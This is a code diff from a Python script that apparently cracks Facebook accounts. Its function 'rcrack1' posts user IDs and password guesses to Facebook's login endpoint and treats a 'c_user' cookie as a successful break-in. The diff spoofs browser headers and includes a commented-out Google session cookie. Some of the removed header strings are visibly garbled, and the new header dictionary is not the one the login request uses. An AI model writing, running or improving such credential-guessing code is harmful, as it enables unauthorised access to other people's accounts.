@@ -215,12 +215,11 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             headers = {
-    'authority': 'web.google.com',
-     'method': 'GET',
-    'path': '/,'
-    'accept': 'tewebt/html,application/webhtml+webml,application/webml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-ewebchange;v=b3;q=0.7',
+    'authority': 'www.google.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'maweb-age=0',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'AEC=Ad49MVFDthJQrzB20QB4BsFYagXxEl6ZdPdhTHq3gzjVb_RveEoiDPCXG-U; NID=511=Bn-xvpVUDcCbte5iF70584q6OMLVxHWldSbky_j5yZX67i9LzQq-RCSr_7s62Cg9O4fTGMROV5Rp_XlsciV_iPJS6eAA8GKT15hRZySWYj-O6EMhU3usxZA1RNx47DRps38PA3IxO-XsUjN-KmZfh9g4-xfXaYOjrklGGcNLr-Q; 1P_JAR=2023-07-08-10',
     'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
     'sec-ch-ua-arch': '""',
     'sec-ch-ua-bitness': '""',
@@ -235,7 +234,9 @@ def rcrack1(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro}
+    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
+    'x-client-data': 'CLWWywEIk9vMAQ==',
+}
             lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
